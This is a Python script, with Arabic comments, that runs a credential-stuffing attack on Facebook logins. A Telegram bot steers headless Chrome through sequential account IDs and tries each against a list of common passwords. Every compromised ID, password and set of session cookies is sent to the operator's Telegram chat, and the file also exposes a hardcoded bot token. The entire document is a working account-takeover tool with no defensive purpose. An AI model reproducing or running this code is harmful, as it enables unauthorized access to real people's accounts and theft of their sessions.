import telebot
import time
import os
import random
import json
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

TOKEN = "7665591962:AAFIIe-izSG4rd71Kruf0xmXM9j11IYdHvc"
bot = telebot.TeleBot(TOKEN)
CHAT_ID = "1879021873" 

PASSWORDS = [
    "123456", "123456789", "12345678", "12345", "password", "1234567", "qwerty", 
    "123123", "112233", "000000", "654321", "1234", "jasser", "vodka", "admin",
    "monkey", "iloveyou", "football", "hacker", "dragon", "master", "killer",
    "1234567890", "0123456789", "987654321", "102030", "555555", "111111",
    "p@ssword", "secret", "love", "alone", "ghost", "black", "angel", "smile",
    "pretty", "sweet", "honey", "mummy", "daddy", "family", "0770", "0550", "0660",
    "2004", "2005", "2006", "1990", "2000"
]

USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
]

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "♻️ بدأ نظام الفحص المستمر (مع إشعارات الحالة).")
    run_scanner(message.chat.id)

def run_scanner(chat_id):
    current_id = 1430771423 
    
    while True:
        # إشعار كل 5 حسابات لكي لا يمتلئ التلجرام
        if current_id % 5 == 0:
            bot.send_message(chat_id, f"🔍 جاري فحص الحزمة التي تبدأ بـ: {current_id}")
            
        ua = random.choice(USER_AGENTS)
        for password in PASSWORDS:
            print(f"Checking: {current_id} | {password}") # لإبقاء السيرفر حياً
            opts = Options()
            opts.add_argument("--headless")
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument(f'user-agent={ua}')
            
            driver = webdriver.Chrome(options=opts)
            
            try:
                driver.get("https://m.facebook.com/login/")
                time.sleep(2)
                
                driver.find_element(By.NAME, "email").send_keys(str(current_id))
                driver.find_element(By.NAME, "pass").send_keys(password)
                
                try:
                    driver.find_element(By.NAME, "login").click()
                except:
                    driver.execute_script("document.querySelector('button[name=\"login\"]').click();")
                
                time.sleep(8)
                
                all_cookies = driver.get_cookies()
                cookie_names = [c['name'] for c in all_cookies]
                
                if "c_user" in cookie_names:
                    success_msg = f"🔥 تم صيد حساب شغال!\n🆔 {current_id}\n🔑 {password}"
                    bot.send_message(chat_id, success_msg)
                    with open(f"hit_{current_id}.json", "w") as f:
                        json.dump(all_cookies, f)
                    with open(f"hit_{current_id}.json", "rb") as f:
                        bot.send_document(chat_id, f)
                    os.remove(f"hit_{current_id}.json")
                    break
                
            except:
                pass
            finally:
                driver.quit()
        
        current_id += 1
        time.sleep(1)

bot.infinity_polling()
